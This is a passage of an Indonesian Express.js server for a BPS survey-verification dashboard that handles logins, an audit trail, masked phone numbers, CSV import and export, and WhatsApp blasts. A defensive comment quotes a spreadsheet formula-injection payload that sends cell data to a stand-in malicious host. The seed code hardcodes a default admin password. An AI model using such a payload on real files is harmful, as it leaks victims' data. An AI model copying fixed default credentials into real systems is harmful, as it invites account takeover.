/**
 * app.js
 * ------
 * Server utama (Express). Menyatukan tiga hal:
 *  1. Menyajikan halaman Dashboard (views/dashboard.html).
 *  2. API JSON untuk data (statistik & daftar responden) yang dibaca Alpine.js.
 *  3. Aksi: upload CSV, tambah manual, dan memicu blast WhatsApp.
 *
 * Jalankan: `npm start` lalu buka http://localhost:3000
 */

// Muat variabel .env SEBELUM modul lain membacanya
require('dotenv').config();

const express = require('express');
const path = require('path');
const fs = require('fs');
const http = require('http');
const { Server } = require('socket.io');
const multer = require('multer');
const { parse } = require('csv-parse/sync');
const session = require('express-session');

const db = require('./database');
const wa = require('./wa-client');
const passport = require('./config/passport');
const authRoutes = require('./routes/auth');
const { ensurePage, ensureApi, requireRole, attachScope } = require('./middleware/auth'); // ISU 4
const scheduler = require('./scheduler');

// --- GUARD: pastikan middleware/auth.js versi terbaru sudah terpasang --------
if (typeof ensurePage !== 'function' || typeof ensureApi !== 'function') {
  console.error('\n============================================================');
  console.error('[FATAL] middleware/auth.js versi LAMA/kosong terdeteksi.');
  console.error('        (fungsi ensurePage / ensureApi tidak ditemukan)');
  console.error('        SOLUSI: timpa file middleware/auth.js dengan versi');
  console.error('        TERBARU, lalu jalankan ulang: npm start');
  console.error('============================================================\n');
  process.exit(1);
}

const app = express();
const PORT = process.env.PORT || 3000;

// --- SELF-CHECK: pastikan database.js versi terbaru sudah terpasang ----------
// Bila file database.js masih versi lama, beri pesan yang jelas & actionable.
(() => {
  const wajib = ['findUserByEmail', 'createUser', 'getStatsToday', 'resolveManual'];
  const hilang = wajib.filter((fn) => typeof db[fn] !== 'function');
  if (hilang.length) {
    console.error('\n============================================================');
    console.error('[FATAL] database.js versi LAMA terdeteksi.');
    console.error(`        Fungsi belum ada: ${hilang.join(', ')}`);
    console.error('        SOLUSI: timpa file database.js dengan versi TERBARU,');
    console.error('        lalu jalankan ulang: npm start');
    console.error('============================================================\n');
  }
})();

// --- SEED: buat akun admin default bila belum ada (memudahkan login pertama) --
try {
  const bcrypt = require('bcryptjs');
  if (typeof db.findUserByEmail === 'function' && !db.findUserByEmail('admin@bps.go.id')) {
    db.createUser({
      nama: 'Administrator BPS',
      role: 'Admin', // ISU 4: akun default = Admin (akses penuh semua data & survei)
      email: 'admin@bps.go.id',
      password: bcrypt.hashSync('bps12345', 10),
    });
    // Password bawaan ini tercetak di konsol dan tertulis di dokumentasi, jadi
    // harus dianggap sudah bocor sejak awal. Akun ditandai wajib ganti password
    // pada login pertama supaya nilai bawaannya tidak pernah dipakai permanen.
    const _admin = db.findUserByEmail('admin@bps.go.id');
    if (_admin) db.tandaiHarusGantiPassword(_admin.id);
    console.log('[SEED] Akun default dibuat -> email: admin@bps.go.id | password: bps12345');
    console.log('[SEED] Password ini WAJIB diganti saat login pertama.');
  }
} catch (e) {
  console.error('[SEED] Dilewati:', e.message);
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// --- SESSION & PASSPORT ------------------------------------------------------
// PENGAMAN 1: sesi disimpan di SQLite (bukan memori) -> tahan restart & banyak user.
const createSqliteStore = require('./config/sqlite-session-store');

// --- GUARD KEAMANAN: SESSION_SECRET wajib ada & bukan nilai contoh -----------
// Cookie sesi ditandatangani memakai kunci ini. Bila kunci diketahui publik
// (mis. nilai default yang ikut ter-commit ke GitHub), penyerang dapat MEMALSUKAN
// cookie login berisi id pengguna mana pun — termasuk akun Admin — tanpa password.
// Karena itu server SENGAJA menolak start daripada diam-diam memakai kunci lemah.
const _SECRET_TERLARANG = [
  'rahasia-dev-harap-ganti-di-produksi',
  'ganti-dengan-string-acak-yang-panjang-dan-unik',
];
const SESSION_SECRET = process.env.SESSION_SECRET || '';
if (!SESSION_SECRET || _SECRET_TERLARANG.includes(SESSION_SECRET) || SESSION_SECRET.length < 16) {
  console.error('\n============================================================');
  console.error('[FATAL] SESSION_SECRET belum diisi dengan benar di file .env');
  console.error('        Kunci ini menandatangani cookie login. Bila kosong,');
  console.error('        memakai nilai contoh, atau terlalu pendek (<16 karakter),');
  console.error('        penyerang bisa memalsukan sesi Admin tanpa password.');
  console.error('');
  console.error('        SOLUSI: buat kunci acak lalu isikan ke .env, contoh —');
  console.error('          node -e "console.log(require(\'crypto\').randomBytes(48).toString(\'hex\'))"');
  console.error('        lalu di .env:  SESSION_SECRET=<hasil perintah di atas>');
  console.error('============================================================\n');
  process.exit(1);
}

app.set('trust proxy', 1); // di belakang tunnel/proxy (Cloudflare) -> cookie Secure benar

// Middleware sesi disimpan ke variabel (bukan langsung dibungkus app.use) karena
// Socket.io ikut memakainya: koneksi WebSocket harus tahu SIAPA yang terhubung,
// supaya notifikasi real-time bisa dikirim hanya kepada pemilik datanya.
const sessionMiddleware = session({
  store: createSqliteStore(db.db),
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    maxAge: 1000 * 60 * 60 * 8,                 // sesi 8 jam
    httpOnly: true,                              // cookie tak bisa dibaca JavaScript (anti-XSS)
    sameSite: 'lax',
    // 'auto' = cookie ditandai Secure HANYA bila koneksinya memang HTTPS
    // (dideteksi dari req.secure / header X-Forwarded-Proto milik tunnel).
    //
    // JANGAN kembalikan ke `true` permanen (mis. lewat COOKIE_SECURE=1):
    // express-session TIDAK mengirim header Set-Cookie sama sekali bila
    // cookie.secure=true tetapi koneksinya HTTP biasa. Akibatnya login via
    // http://localhost seolah "berhasil lalu balik ke halaman login" —
    // password benar dan sesi tercatat, tetapi browser tak pernah menerima
    // cookienya. Dengan 'auto', lokal (HTTP) dan tunnel (HTTPS) sama-sama jalan.
    secure: 'auto',
  },
});
app.use(sessionMiddleware);
app.use(passport.initialize());
app.use(passport.session());

// Rute autentikasi (PUBLIK): /login, /signup, /forgot, /auth/google, /logout, dll
app.use('/', authRoutes);

// Konfigurasi upload sementara (file CSV masuk ke folder /uploads lalu dihapus)
const upload = multer({ dest: path.join(__dirname, 'uploads') });

// -----------------------------------------------------------------------------
// HALAMAN DASHBOARD (DILINDUNGI — wajib login)
// -----------------------------------------------------------------------------
app.get('/', ensurePage, (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'dashboard.html'));
});

// -----------------------------------------------------------------------------
// PROTEKSI SEMUA ENDPOINT /api (wajib login) — Graceful: balas 401 JSON
// -----------------------------------------------------------------------------
app.use('/api', ensureApi);
// ISU 3: setiap request /api otomatis punya req.scope { id_kegiatan, pml_id }
app.use('/api', attachScope(db));

// =============================================================================
// MITIGASI ISU 1 — PAKTA INTEGRITAS KERAHASIAAN DATA
// Pengguna WAJIB menyetujui pernyataan kerahasiaan sebelum dapat mengakses data.
// Versi pakta disimpan; bila naskah diperbarui, persetujuan diminta ulang.
// =============================================================================
const PAKTA_VERSI = '1.0';

// Helper: identitas pemakai + IP untuk pencatatan audit
const jejak = (req) => ({
  user_email: (req.user && req.user.email) || '(anonim)',
  ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || '',
});

// Status pakta pengguna saat ini
app.get('/api/pakta', (req, res) => {
  const u = req.user || {};
  res.json({ versi: PAKTA_VERSI, disetujui: u.pakta_versi === PAKTA_VERSI, waktu: u.pakta_at || null });
});

// Menyetujui pakta (dicatat di audit trail)
app.post('/api/pakta', (req, res) => {
  if (!req.body || req.body.setuju !== true) {
    return res.status(400).json({ error: 'Persetujuan wajib dicentang untuk melanjutkan.' });
  }
  db.acceptPakta(req.user.id, PAKTA_VERSI);
  db.logAudit({ ...jejak(req), aksi: 'SETUJU_PAKTA', detail: `Pakta Integritas v${PAKTA_VERSI}` });
  res.json({ ok: true });
});

// Gerbang: semua endpoint data DI BAWAH baris ini butuh pakta yang sudah disetujui.
// Dikecualikan: /api/me, /api/pakta, /api/wa-status (tidak memuat data rahasia).
app.use('/api', (req, res, next) => {
  // '/ganti-password' ikut dibebaskan: mengganti password sendiri bukan akses
  // data rahasia, dan bila digerbang pakta maka alurnya bisa saling mengunci.
  const bebas = ['/me', '/pakta', '/wa-status', '/ganti-password'];
  if (bebas.includes(req.path)) return next();
  const u = req.user || {};
  if (u.pakta_versi !== PAKTA_VERSI) {
    return res.status(403).json({
      error: 'Anda belum menyetujui Pakta Integritas Kerahasiaan Data.',
      butuh_pakta: true,
    });
  }
  next();
});

// Info user yang sedang login (untuk header dashboard)
app.get('/api/me', (req, res) => {
  const u = req.user || {};
  // ISU 1+4: kirim role & kegiatan aktif agar dashboard menyesuaikan tampilan
  res.json({
    nama: u.nama, email: u.email, role: u.role || 'PML', scope: req.scope,
    // Ditampilkan pada panel "Profil Saya" sebagai bukti kepatuhan kerahasiaan
    pakta_at: u.pakta_at || null, pakta_versi: u.pakta_versi || null,
    // Dashboard memakai penanda ini untuk memblokir tampilan sampai password diganti
    harus_ganti_password: !!u.harus_ganti_password,
  });
});

// Ganti password sendiri. Dipakai untuk mencabut password bawaan akun admin
// (bps12345) yang tercetak di konsol/dokumentasi sehingga harus dianggap bocor.
app.post('/api/ganti-password', (req, res) => {
  const bcrypt = require('bcryptjs');
  const u = req.user || {};
  const { password_lama, password_baru } = req.body || {};

  if (!password_lama || !password_baru) {
    return res.status(400).json({ error: 'Password lama dan baru wajib diisi.' });
  }
  if (String(password_baru).length < 8) {
    return res.status(400).json({ error: 'Password baru minimal 8 karakter.' });
  }
  if (String(password_baru) === String(password_lama)) {
    return res.status(400).json({ error: 'Password baru harus berbeda dari password lama.' });
  }
  // Tolak nilai bawaan agar kewajiban ganti password tidak bisa "diakali"
  if (['bps12345', 'admin', 'password', '12345678'].includes(String(password_baru).toLowerCase())) {
    return res.status(400).json({ error: 'Password terlalu mudah ditebak. Gunakan kombinasi lain.' });
  }

  const akun = db.findUserByEmail(u.email);
  if (!akun || !akun.password || !bcrypt.compareSync(String(password_lama), akun.password)) {
    return res.status(401).json({ error: 'Password lama tidak cocok.' });
  }

  db.gantiPasswordSelesai(akun.id, bcrypt.hashSync(String(password_baru), 10));
  if (req.user) req.user.harus_ganti_password = 0; // segarkan sesi berjalan
  db.logAudit({ ...jejak(req), aksi: 'GANTI_PASSWORD', detail: 'ganti password mandiri' });
  res.json({ ok: true, message: 'Password berhasil diganti.' });
});

// Ubah data profil sendiri (nama tampilan). Dipakai menu "Profil Saya" di
// dashboard. Email & peran SENGAJA tidak bisa diubah sendiri: email adalah kunci
// identitas di jejak audit, dan peran adalah kewenangan yang hanya boleh
// ditetapkan Admin lewat pembuatan akun.
app.post('/api/profil', (req, res) => {
  const nama = String((req.body && req.body.nama) || '').trim();
  if (!nama) return res.status(400).json({ error: 'Nama tidak boleh kosong.' });
  if (nama.length > 80) return res.status(400).json({ error: 'Nama maksimal 80 karakter.' });

  db.updateNamaUser(req.user.id, nama);
  if (req.user) req.user.nama = nama;   // segarkan sesi yang sedang berjalan
  db.logAudit({ ...jejak(req), aksi: 'UBAH_PROFIL', detail: `nama menjadi "${nama}"`, jumlah: 1 });
  res.json({ ok: true, nama });
});

// ISU 1: daftar kegiatan untuk pemilih di dashboard.
// PML hanya melihat kegiatan yang ia ikuti; Admin melihat semua.
app.get('/api/kegiatan', (req, res) => res.json(db.listKegiatanForUser(req.user)));
// Admin dapat menambah kegiatan baru
app.post('/api/kegiatan', requireRole('Admin'), (req, res) => {
  try {
    const { kode, nama, template_pesan } = req.body || {};
    if (!kode || !nama) return res.status(400).json({ error: 'Kode dan nama kegiatan wajib diisi.' });
    const id = db.createKegiatan({ kode, nama, template_pesan });
    res.status(201).json({ ok: true, id });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Template pesan verifikasi milik satu kegiatan (khusus Admin).
// Isi pesan sangat menentukan mau-tidaknya responden membalas, sehingga tiap
// survei boleh punya redaksi sendiri: SE2026 menyapa pelaku usaha, sedangkan
// Sakernas/Susenas menyapa rumah tangga. Kosongkan = kembali ke template bawaan.
app.post('/api/kegiatan/:id/template', requireRole('Admin'), (req, res) => {
  const id = Number(req.params.id);
  if (!id || !db.getKegiatan(id)) return res.status(404).json({ error: 'Kegiatan tidak ditemukan.' });

  const isi = String((req.body && req.body.template_pesan) || '').trim();
  if (isi.length > 1200) {
    return res.status(400).json({ error: 'Template terlalu panjang (maksimal 1200 karakter).' });
  }
  // Pesan tanpa instruksi 1/2 membuat balasan tak terbaca sistem: handleIncoming
  // hanya mengenali angka 1 dan 2; selain itu responden dijawab "mohon balas angka".
  if (isi && !(isi.includes('1') && isi.includes('2'))) {
    return res.status(400).json({
      error: 'Template harus tetap meminta responden membalas angka 1 (ya) dan 2 (tidak) — di luar itu balasan tidak dikenali sistem.',
    });
  }

  const tersimpan = db.setTemplateKegiatan(id, isi);
  db.logAudit({ ...jejak(req), aksi: 'UBAH_TEMPLATE', detail: `kegiatan#${id} -> ${tersimpan ? 'template khusus' : 'kembali ke bawaan'}`, jumlah: 1 });
  res.json({ ok: true, template_pesan: tersimpan });
});

// Template bawaan, untuk ditawarkan sebagai titik awal saat Admin menyunting.
app.get('/api/template-bawaan', requireRole('Admin'), (req, res) => {
  res.json({ template_pesan: wa.TEMPLATE_BAWAAN });
});

// --- KELOLA KEANGGOTAAN PML (khusus Admin) ---
// Daftar PML beserta kegiatan yang diikutinya
app.get('/api/pml', requireRole('Admin'), (req, res) => res.json(db.listPmlDenganKegiatan()));

// PENGAMAN 2: Admin membuat akun PML (karena swa-daftar dimatikan)
app.post('/api/pml', requireRole('Admin'), (req, res) => {
  try {
    const bcrypt = require('bcryptjs');
    const { nama, email, password } = req.body || {};
    if (!email || !password) return res.status(400).json({ error: 'Email dan password wajib diisi.' });
    if (String(password).length < 6) return res.status(400).json({ error: 'Password minimal 6 karakter.' });
    if (db.findUserByEmail(email)) return res.status(409).json({ error: 'Email sudah terdaftar.' });
    const id = db.createUser({ nama, email, password: bcrypt.hashSync(String(password), 10), role: 'PML' });
    db.logAudit({ ...jejak(req), aksi: 'BUAT_AKUN_PML', detail: `${nama || ''} <${email}>`, jumlah: 1 });
    res.status(201).json({ ok: true, id });
  } catch (e) { res.status(400).json({ error: e.message }); }
});
// Daftarkan / keluarkan PML dari sebuah kegiatan
app.post('/api/pml/:id/kegiatan', requireRole('Admin'), (req, res) => {
  const pmlId = Number(req.params.id);
  const idKeg = Number(req.body && req.body.id_kegiatan);
  const aksi = (req.body && req.body.aksi) || 'tambah';
  if (!pmlId || !idKeg) return res.status(400).json({ error: 'pml_id dan id_kegiatan wajib.' });
  if (aksi === 'hapus') db.keluarkanPml(pmlId, idKeg);
  else db.daftarkanPml(pmlId, idKeg);
  db.logAudit({ ...jejak(req), aksi: 'KELOLA_PML', detail: `${aksi} PML#${pmlId} @kegiatan#${idKeg}`, jumlah: 1 });
  res.json({ ok: true, kegiatan: db.getKegiatanIdsForPml(pmlId) });
});

// -----------------------------------------------------------------------------
// API: DATA (dibaca oleh Alpine.js secara berkala)
// -----------------------------------------------------------------------------
app.get('/api/stats', (req, res) => res.json(db.getStatsScoped(req.scope))); // ISU 3
// MITIGASI ISU 1: nomor HP dikirim ke browser dalam bentuk TER-MASKING.
// Nomor lengkap tidak pernah keluar dari server kecuali lewat aksi eksplisit
// pada endpoint /api/reveal/:id yang selalu dicatat di audit trail.
app.get('/api/responden', (req, res) => res.json(db.getAllScoped(req.scope).map(db.toSafeRow))); // ISU 3

// Buka nomor lengkap SATU baris (aksi sadar & tercatat)
app.get('/api/reveal/:id', (req, res) => {
  const id = Number(req.params.id);
  const row = db.getByIdScoped(id, req.scope);   // ISU 3: hanya bila milik scope ini
  if (!row) return res.status(404).json({ error: 'Data tidak ditemukan.' });
  if (row.anonim_at) return res.status(410).json({ error: 'Nomor sudah dimusnahkan sesuai kebijakan retensi.' });
  db.logAudit({ ...jejak(req), aksi: 'BUKA_NOMOR', detail: `#${id} ${row.nama_usaha}`, jumlah: 1 });
  res.json({ id, no_hp: row.no_hp, no_hp_petugas: row.no_hp_petugas });
});

// Audit trail (jejak akses data) — transparansi bagi pengawas
// Jejak audit = alat pengawasan -> KHUSUS Admin (Bug: PML tak boleh lihat)
app.get('/api/audit-log', requireRole('Admin'), (req, res) => res.json(db.getAuditLog(req.query.limit || 100)));

// MITIGASI ISU 2: rekap provenance (asal-usul) data — ISU 3: ikut scope pemanggil
app.get('/api/rekap-sumber', (req, res) => res.json(db.getRekapSumberScoped(req.scope)));

// MITIGASI ISU 2: pilih sampel acak dari data PENDING (bila kerangka tak lengkap)
// ISU 3: sampel diambil hanya dari data milik pemanggil pada kegiatan aktif.
app.post('/api/sample', (req, res) => {
  const n = Number(req.body && req.body.jumlah) || 10;
  const ids = db.getSampleIdsScoped(n, req.scope);
  db.logAudit({ ...jejak(req), aksi: 'PILIH_SAMPEL', detail: `sampel acak ${ids.length} baris`, jumlah: ids.length });
  res.json({ ok: true, ids, jumlah: ids.length });
});

// MITIGASI ISU 1: pemusnahan nomor sesuai kebijakan retensi.
// KHUSUS ADMIN: tindakan ini permanen. Sebelumnya endpoint ini tidak memeriksa
// peran sama sekali — hanya tombolnya yang disembunyikan di UI — sehingga PML mana
// pun bisa memanggilnya langsung. ISU 3: kini juga dibatasi ke kegiatan aktif.
app.post('/api/purge', requireRole('Admin'), (req, res) => {
  const hari = req.body && req.body.hari !== undefined ? Number(req.body.hari) : 30;
  const n = db.purgeNomorLamaScoped(hari, req.scope);
  db.logAudit({ ...jejak(req), aksi: 'MUSNAHKAN_NOMOR', detail: `retensi ${hari} hari`, jumlah: n });
  res.json({ ok: true, jumlah: n, message: `${n} nomor telah dimusnahkan (retensi ${hari} hari).` });
});
app.get('/api/wa-status', (req, res) => res.json({ ready: wa.isReady() }));

// -----------------------------------------------------------------------------
// API: TAMBAH SATU RESPONDEN (manual via form JSON)
// -----------------------------------------------------------------------------
app.post('/api/responden', (req, res) => {
  try {
    const { nama_usaha, no_hp, nama_petugas, no_hp_petugas, sumber_data } = req.body;
    if (!nama_usaha || !no_hp || !nama_petugas) {
      return res.status(400).json({ error: 'Nama usaha, No HP, dan Nama petugas wajib diisi.' });
    }
    // ISU 1+3: data baru otomatis terikat ke kegiatan aktif & PML pembuatnya
    const id = db.insertResponden({
      nama_usaha, no_hp, nama_petugas, no_hp_petugas, sumber_data,
      id_kegiatan: req.scope.id_kegiatan,
      pml_id: req.user.id,
    });
    db.logAudit({ ...jejak(req), aksi: 'TAMBAH_DATA', detail: `#${id} ${nama_usaha} (${sumber_data || 'MANUAL_PML'})`, jumlah: 1 });
    res.json({ ok: true, id });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// -----------------------------------------------------------------------------
// API: UPLOAD CSV
// Header CSV yang dikenali: nama_usaha, no_hp, nama_petugas
// (kolom alternatif juga didukung: usaha / hp / nomor / petugas)
// -----------------------------------------------------------------------------
app.post('/api/upload', upload.single('file'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'File CSV wajib diupload.' });

  try {
    const content = fs.readFileSync(req.file.path);
    const records = parse(content, {
      columns: true,
      skip_empty_lines: true,
      trim: true,
      bom: true, // toleran terhadap file dari Excel (BOM)
    });

    let ok = 0;
    let skip = 0;
    const errors = [];

    for (const r of records) {
      // Normalisasi nama kolom -> huruf kecil, agar header UPPERCASE (template) juga terbaca
      const low = {};
      for (const k in r) low[String(k).toLowerCase().trim()] = r[k];

      const nama_usaha = low.nama_usaha || low.usaha || low.nama || '';
      const no_hp = low.no_hp || low.hp || low.nomor || low.telepon || '';
      const nama_petugas = low.nama_petugas || low.petugas || '';
      // OPSIONAL: nomor HP petugas (untuk Auto-Teguran)
      const no_hp_petugas = low.no_hp_petugas || low.hp_petugas || low.petugas_hp || '';
      // MITIGASI ISU 2: asal data per baris. Prioritas: kolom CSV -> pilihan di form -> default
      const sumber_data =
        String(low.sumber_data || low.sumber || req.body.sumber_data || 'MANUAL_PML').toUpperCase().trim();

      if (!nama_usaha || !no_hp || !nama_petugas) {
        skip++;
        continue;
      }
      try {
        db.insertResponden({
          nama_usaha, no_hp, nama_petugas, no_hp_petugas, sumber_data,
          id_kegiatan: req.scope.id_kegiatan,   // ISU 1
          pml_id: req.user.id,                  // ISU 3
        });
        ok++;
      } catch (e) {
        skip++;
        errors.push(e.message);
      }
    }

    db.logAudit({
      ...jejak(req),
      aksi: 'IMPOR_DATA',
      detail: `CSV "${req.file.originalname || 'tanpa nama'}" (${ok} masuk, ${skip} dilewati)`,
      jumlah: ok,
    });
    res.json({ ok, skip, total: records.length, errors: errors.slice(0, 5) });
  } catch (err) {
    res.status(400).json({ error: 'Gagal membaca CSV: ' + err.message });
  } finally {
    // Bersihkan file sementara
    fs.unlink(req.file.path, () => {});
  }
});

// -----------------------------------------------------------------------------
// API: BLAST (fire-and-forget)
// Mengembalikan respons langsung; progres tercermin di tabel saat status berubah.
//
// Nomor gateway hanya SATU untuk seluruh PML, jadi seluruh blast dijalankan
// berurutan lewat antrean global di wa-client.js. Bila sedang ada blast lain,
// pesan balasan memberi tahu berapa pesan yang menunggu di depan — supaya PML
// tidak mengira tombolnya tidak berfungsi lalu menekannya berulang kali.
// -----------------------------------------------------------------------------
function pesanAntrean(dasar, antre) {
  if (!antre || antre.pesanDiDepan <= 0) return `${dasar} Pantau progres pada tabel di bawah.`;
  return `${dasar} Masuk antrean: ada ${antre.pesanDiDepan} pesan di depan Anda ` +
         `(perkiraan mulai ~${antre.estimasiMenit} menit lagi). Pengiriman berjalan otomatis, tidak perlu ditekan ulang.`;
}

app.post('/api/blast', (req, res) => {
  const siap = wa.isReady();
  const pendingScoped = db.getPendingScoped(req.scope);   // ISU 3: hanya data dalam scope
  const jumlah = pendingScoped.length;
  console.log(`\n[BLAST] Tombol ditekan. Gateway siap = ${siap} | Responden PENDING = ${jumlah}`);

  if (!siap) {
    console.log('[BLAST] Dibatalkan: gateway WA belum siap (belum muncul "Gateway SIAP").');
    return res.status(400).json({ error: 'Gateway WA belum siap. Scan QR di terminal dulu (tunggu "Gateway SIAP").' });
  }

  if (jumlah === 0) {
    console.log('[BLAST] Dibatalkan: tidak ada responden berstatus PENDING.');
    return res.json({ ok: true, message: 'Tidak ada responden berstatus PENDING.' });
  }

  console.log(`[BLAST] Memulai pengiriman ke ${jumlah} responden…`);
  db.logAudit({ ...jejak(req), aksi: 'BLAST_SEMUA', detail: 'kirim verifikasi ke seluruh PENDING', jumlah });

  // Dibaca SEBELUM menambah tugas, sehingga angkanya benar-benar "di depan Anda".
  const antre = wa.antreanInfo();

  // Jalankan di background agar HTTP tidak menunggu (blast bisa lama karena jeda)
  // ISU 1+3: baris ter-scope + nama_survei. Konteks pemanggil dipakai agar
  // notifikasi "blast selesai" hanya sampai ke pemilik data + Admin.
  wa.blastPending(pendingScoped, { pml_id: req.user.id, id_kegiatan: req.scope.id_kegiatan })
    .then((r) => console.log('[BLAST] Selesai:', r))
    .catch((e) => console.error('[BLAST] Error:', e.message));

  res.json({
    ok: true,
    antrean: antre,
    message: pesanAntrean(`Blast dimulai untuk ${jumlah} responden.`, antre),
  });
});

// -----------------------------------------------------------------------------
// API: RESET STATUS (untuk uji coba / kirim ulang)
// Mengembalikan responden ke status PENDING agar bisa di-blast lagi.
// Body opsional { id: <number> } untuk reset satu baris; tanpa id = reset semua.
// -----------------------------------------------------------------------------
// ISU 3: reset dibatasi ke kegiatan aktif (dan, bagi PML, ke barisnya sendiri).
// Sebelumnya `id` dipakai apa adanya dari body tanpa penjaga kepemilikan, sehingga
// satu PML bisa menghapus hasil verifikasi milik PML lain — atau seluruh tabel.
// Aksi ini destruktif (VALID/FRAUD hilang) maka sekarang ikut dicatat di jejak audit.
app.post('/api/reset', (req, res) => {
  const { id } = req.body || {};
  if (id !== undefined && !Number.isFinite(Number(id))) {
    return res.status(400).json({ error: 'Parameter id tidak valid.' });
  }
  const info = id !== undefined ? db.resetOneScoped(id, req.scope) : db.resetAllScoped(req.scope);
  const n = Number(info.changes || 0);
  db.logAudit({
    ...jejak(req),
    aksi: 'RESET_STATUS',
    detail: id !== undefined ? `reset 1 responden (id ${Number(id)})` : 'reset seluruh responden dalam kegiatan',
    jumlah: n,
  });
  console.log(`[RESET] ${n} responden dikembalikan ke status PENDING.`);
  res.json({ ok: true, changes: n });
});

// -----------------------------------------------------------------------------
// FITUR 1: BLAST TERPILIH (throttling 5-8 detik diatur di wa-client.blastByIds)
// Body: { ids: [1,2,3] }
// -----------------------------------------------------------------------------
app.post('/api/blast-selected', (req, res) => {
  if (!wa.isReady()) {
    return res.status(400).json({ error: 'Gateway WA belum siap. Scan QR dulu.' });
  }
  const ids = Array.isArray(req.body && req.body.ids) ? req.body.ids : [];
  if (ids.length === 0) {
    return res.status(400).json({ error: 'Tidak ada responden yang dipilih.' });
  }
  // ISU 3: filter id ke scope milik user -> hanya datanya yang boleh dikirim
  const rowsScoped = db.getByIdsScoped(ids, req.scope);
  if (rowsScoped.length === 0) {
    return res.status(403).json({ error: 'Tidak ada data terpilih yang berada dalam wewenang Anda.' });
  }
  console.log(`[BLAST-SELECTED] Memulai pengiriman ke ${rowsScoped.length} responden terpilih…`);
  db.logAudit({ ...jejak(req), aksi: 'BLAST_TERPILIH', detail: `id: ${rowsScoped.map((r)=>r.id).slice(0, 20).join(',')}`, jumlah: rowsScoped.length });

  const antre = wa.antreanInfo();   // dibaca sebelum tugas ini masuk barisan
  wa.blastByIds(ids, rowsScoped, { pml_id: req.user.id, id_kegiatan: req.scope.id_kegiatan })
    .then((r) => console.log('[BLAST-SELECTED] Selesai:', r))
    .catch((e) => console.error('[BLAST-SELECTED] Error:', e.message));
  res.json({
    ok: true,
    antrean: antre,
    message: pesanAntrean(`Blast dimulai untuk ${rowsScoped.length} responden terpilih (jeda 5-8 detik/pesan).`, antre),
  });
});

// -----------------------------------------------------------------------------
// FITUR 7: VALIDASI MANUAL (ubah FRAUD -> VALID_MANUAL)
// -----------------------------------------------------------------------------
app.post('/api/resolve/:id', (req, res) => {
  const id = Number(req.params.id);
  if (!db.getByIdScoped(id, req.scope)) return res.status(404).json({ error: 'Data tidak ditemukan.' }); // ISU 3
  const info = db.resolveManual(id);
  console.log(`[RESOLVE] Responden #${id} divalidasi manual menjadi VALID_MANUAL.`);
  db.logAudit({ ...jejak(req), aksi: 'VALIDASI_MANUAL', detail: `#${id} Fraud -> Valid (Manual)`, jumlah: 1 });
  res.json({ ok: true, changes: Number(info.changes || 0) });
});

// -----------------------------------------------------------------------------
// FITUR 2: TEMPLATE & EKSPOR CSV
// -----------------------------------------------------------------------------
// Bungkus sel CSV: beri tanda kutip bila mengandung koma / kutip / baris baru.
//
// KEAMANAN (CSV/Formula Injection): Excel & Google Sheets memperlakukan sel yang
// diawali = + - @ (juga TAB/CR) sebagai RUMUS, bukan teks. Karena nama usaha &
// nama petugas diisi pengguna, nilai seperti
//   =HYPERLINK("http://situs-jahat/?c="&A1,"klik")
// akan AKTIF di komputer Admin saat file ekspor dibuka — bisa membocorkan isi sel
// lain. Solusi baku: sisipkan tanda kutip tunggal di depan sehingga dibaca sebagai
// teks biasa. Catatan: nomor berformat "+62..." ikut diawali kutip — ini disengaja
// dan tetap tampil benar sebagai teks di spreadsheet.
function csvCell(v) {
  let s = v === null || v === undefined ? '' : String(v);
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  return /[",\n\r]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
}
function csvRow(arr) {
  return arr.map(csvCell).join(',');
}

app.get('/api/download-template', (req, res) => {
  // \uFEFF (BOM) agar Excel membuka UTF-8 dengan benar
  // NO_HP_PETUGAS opsional (untuk fitur Auto-Teguran)
  // SUMBER_DATA (MITIGASI ISU 2): SQL_LAB | CAPI | MANUAL_PML | LAINNYA
  const csv = '\uFEFF' + [
    'NAMA_USAHA,NO_HP,PETUGAS,NO_HP_PETUGAS,SUMBER_DATA',
    'Contoh Usaha,08123456789,Nama Petugas,081200000000,MANUAL_PML',
  ].join('\r\n');
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', 'attachment; filename="template.csv"');
  res.send(csv);
});

app.get('/api/export-report', (req, res) => {
  // MITIGASI ISU 1:
  //  (a) Default ekspor TER-MASKING. Nomor penuh hanya bila ?penuh=1 (tercatat di audit).
  //  (b) WATERMARK: identitas pengunduh + waktu ditanam di file, agar kebocoran terlacak.
  //  (c) ISU 3: ekspor WAJIB ter-scope. Sebelumnya memakai db.getAll() tanpa filter,
  //      sehingga PML mana pun bisa mengunduh SELURUH data lintas kegiatan & lintas
  //      PML — dan dengan ?penuh=1 ikut mendapat nomor asli yang tidak tersamar.
  //      Admin tetap memperoleh seluruh baris pada kegiatan aktif (pml_id = null).
  const penuh = req.query.penuh === '1';
  const rows = db.getAllScoped(req.scope);
  const j = jejak(req);

  const watermark =
    `# DOKUMEN RAHASIA - BPS Kabupaten Karangasem` +
    ` | Diunduh oleh: ${j.user_email}` +
    ` | Waktu: ${new Date().toLocaleString('id-ID')}` +
    ` | Mode: ${penuh ? 'NOMOR PENUH' : 'NOMOR TERSAMAR'}` +
    ` | Dilarang disebarluaskan (UU 16/1997 & UU 27/2022)`;

  const header = ['NAMA_USAHA', 'NO_HP', 'PETUGAS', 'STATUS', 'BALASAN', 'SUMBER_DATA', 'WAKTU_KIRIM', 'WAKTU_BALAS'];
  const lines = [csvRow([watermark]), csvRow(header)];
  for (const r of rows) {
    const nohp = r.anonim_at ? '[DIMUSNAHKAN]' : (penuh ? r.no_hp : db.maskNumber(r.no_hp));
    lines.push(csvRow([r.nama_usaha, nohp, r.nama_petugas, r.status, r.balasan, r.sumber_data, r.waktu_kirim, r.waktu_balas]));
  }

  db.logAudit({
    ...j,
    aksi: 'EKSPOR_DATA',
    detail: penuh ? 'CSV nomor PENUH' : 'CSV nomor tersamar',
    jumlah: rows.length,
  });

  const csv = '\uFEFF' + lines.join('\r\n');
